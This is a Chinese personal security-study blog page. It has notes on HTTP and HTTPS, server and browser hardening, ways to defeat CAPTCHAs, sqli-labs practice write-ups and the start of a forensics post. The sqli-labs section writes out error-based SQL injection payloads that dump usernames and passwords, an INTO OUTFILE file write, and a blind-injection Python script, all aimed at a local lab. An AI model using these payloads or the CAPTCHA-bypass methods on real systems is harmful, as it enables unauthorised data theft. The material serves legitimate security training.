<p><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/2.png" alt></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-web基础-1" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/"
    >web基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/" class="article-date">
  <time datetime="2020-06-17T03:05:06.000Z" itemprop="datePublished">2020-06-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
<p><strong>HTTP原理：</strong></p>
<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
<h4 id="—-HTTP请求过程"><a href="#—-HTTP请求过程" class="headerlink" title="—-HTTP请求过程"></a><strong>—-HTTP请求过程</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
<p>路径：<code>/full/url/path</code>；</p>
<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
<p>以及其他相关的Header；</p>
<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
<p>以及其他相关的Header；</p>
<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>

<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
<p>HTTP POST请求的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
<p>HTTP响应的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p><strong>Https设计目标：</strong></p>
<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
<p><strong>Https原理：</strong></p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、<strong>https协议需要到CA</strong> （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，<strong>前者是80，后者是443</strong>。</p>
<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行<strong>加密传输、身份认证</strong>的网络协议，比http协议安全。(<strong>无状态的意思是其数据包的发送、传输和接收都是相互独立的</strong>。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长。</p>
<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
<p>3、<strong>Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持</strong>等方面几乎<strong>起不到什么作用</strong>。</p>
<p>4、<strong>SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名</strong>，IPv4资源不可能支撑这个消耗。</p>
<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 <strong>SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本</strong>。</p>
<p>6、Https协议的<strong>加密范围也比较有限</strong>。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
<p>b、管线化，客户端<strong>可以同时发出多个HTTP请求</strong>，而不用一个个等待响应</p>
<p>c、<strong>断点续传原理</strong></p>
<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>
<h3 id="web服务器端安全保护措施："><a href="#web服务器端安全保护措施：" class="headerlink" title="web服务器端安全保护措施："></a><strong>web服务器端安全保护措施：</strong></h3><p>1.更改服务器远程端口，默认端口为80，相对来讲不太安全，建议改为随机的5位数端口。<br>2.设置防火墙并关闭不需要的服务和端口。<br>3.定时为数据进行备份。<br>4.把密码设置的复杂一点（防止黑客暴力破解）<br>5.修补已知的漏洞(即时打补丁)<br>6.可以上传的目录不给执行权限，可以执行的目录不给上传权限(防止入侵者通过上传获得webshell)<br>7.降低数据库连接帐户SA的权限，使用public最安全，这样入侵者只能通过猜解用户名和密码来获得webshell</p>
<p>禁止系统文件被非法修改、禁止非法提权操作、禁止恶意代码执行、</p>
<p>禁止加载没有数字签名的驱动、优化系统配置及服务等</p>
<h3 id="web浏览器端采取安全措施"><a href="#web浏览器端采取安全措施" class="headerlink" title="web浏览器端采取安全措施"></a><strong>web浏览器端采取安全措施</strong></h3><p><strong>浏览器的安全机制包括 网页安全模型 和 沙箱模型</strong></p>
<p><strong>1.开启同源策略</strong></p>
<p><strong>2.开启CSP策略</strong></p>
<p>以白名单的形式配置可信任的内容来源在网页中,能够使白名单中的内容正常执行(包含Js,CSS, Image等等)而非白名单的内容无法正常执行,从而减少跨站脚本攻击(XSS)当然,也能够减少运营商劫持的内容注入攻击</p>
<p><strong>3.创建沙箱模型</strong></p>
<p>而沙箱模型则是利用了 Chromium 实现的，利用 代理进程 来创建独立的环境让 目标进程 在当中安全运行。</p>
<p><strong>4.加强cookie防护</strong></p>
<p>定期清理cookie，不在cookie中存放敏感信息，<strong>使用session和cookie双重验证</strong>，增加登录随机验证码，</p>
<p>设置HttpOnly, 如果设置该属性，客户端javascript无法获取Cookie的值</p>
<p><strong>5.安装补丁及配置安全设置</strong></p>
<p>禁止javascript脚本、ActiveX的运行</p>
<p><strong>6.使用安全通信协议</strong></p>
<p>使用HTTPS协议进行通信，保证数据传输的安全。</p>
<h2 id="网页验证码技术有哪几种，特点，怎么攻破？"><a href="#网页验证码技术有哪几种，特点，怎么攻破？" class="headerlink" title="网页验证码技术有哪几种，特点，怎么攻破？"></a><strong>网页验证码技术有哪几种，特点，怎么攻破？</strong></h2><p>总的来讲，可以大致划分为三类：</p>
<p><strong>1.字符型验证码：**</strong>常见的数字字母混合验证**</p>
<p><strong>2.图片型验证码：滑动验证码、识别图片物体型、旋转图片型、点触验证码</strong></p>
<p><strong>3.智能型：计算题验证码、语音验证码、短信验证码</strong></p>
<p>特点：</p>
<p><strong>字符型验证码：由各种复杂的字母数字组合而成，且验证码背景有线条干扰或大量小点分布</strong></p>
<p>对于这类验证码，一般的步骤是，先爬取验证码图片到本地，随后对验证码进行识别，识别验证码一般采用OCR技术，即字符识别技术，为了提高识别的准确度，我们会先对图片进行灰度化，再进行二值化，这样识别的准确度会大大提高。也可利用第三方平台的接口，进行破解。</p>
<p><strong>图片型验证码：像图片识别类的验证码的特点主要是复杂，机器辨识度低，机器可替代性弱。</strong></p>
<p>但是现在一样可以做到攻破这类验证码，比如滑动验证码，将背景图、滑块图保存到本地，对比两张图片的位置信息，然后确度滑块位置，利用selenium模块下的函数，模拟点击滑块进行滑动，即可绕过。</p>
<p><strong>智能型验证码：特点主要在于难度高，机器识别困难。</strong></p>
<p>对于这一类可以利用cookie登录，利用cookie的特性：cookie会保持较长的时间，来避免用户频繁登录。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-sqli-labs" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/19/sqli-labs/"
    >sqli-labs</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/19/sqli-labs/" class="article-date">
  <time datetime="2020-05-19T03:57:08.000Z" itemprop="datePublished">2020-05-19</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>知识点：</p>
<p>这题可采用报错注入，updatexml（1，xxx，1） 或者 extractvalue（1，x）</p>
<p>extractvalue(目标xml文档，xml路径)</p>
<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<p>group_concat():可将相同行的字段整合在一起</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆库</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1                                      </span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆列</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='users') ,0x7e)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(id,0x7e,username,0x7e,password)from users),1) and '1</span><br><span class="line"><span class="comment">#回显不全，可改为concat---limit 0,1 进行逐个查询</span></span><br><span class="line">?id=1' and updatexml(1,(select concat(id,0x7e,username,0x7e,password) from users limit 4,1),1) and '1</span><br></pre></td></tr></table></figure>



<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>和上一关一样，只不过把单引号变成双引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>



<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Forensics" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/26/Forensics/"
    >Computer Forensics</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/26/Forensics/" class="article-date">
  <time datetime="2020-04-26T05:10:03.000Z" itemprop="datePublished">2020-04-26</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="文件系统取证"><a href="#文件系统取证" class="headerlink" title="文件系统取证"></a><strong>文件系统取证</strong></h2><p>课程要求：</p>
<p>了解：计算机启动过程、硬盘结构。</p>
<p>掌握：<strong>FAT文件系统</strong>取证、FAT取证实例、<strong>NTFS文件系统</strong>取证、NTFS取证实例。</p>
<p>英文单词：</p>
<p>clusters: 簇，最小单位</p>
<p>操作系统规定<strong>一个簇中只能放置一个文件的内容</strong>，因此文件所占用的空间，只能是簇的整数倍；如果文件实际大小小于一簇，它也要占一簇的空间。如果文件实际大小大于一簇，根据逻辑推算，那么该文件就要占两个簇的空间。所以，一般情况下文件所占空间要略大于文件的实际大小，只有在少数情况下，即文件的实际大小恰好是簇的整数倍时，文件的实际大小才会与所占空间完全一致。</p>
<p>1.分区表MBR</p>
<p>4个分区表中包含哪些信息</p>
<p>—分区的类型、状态、大小、起始地址、结束地址等等</p>
<p>，内容</p>
<p>2.创建、删除、恢复（在FAT\NTFS)</p>
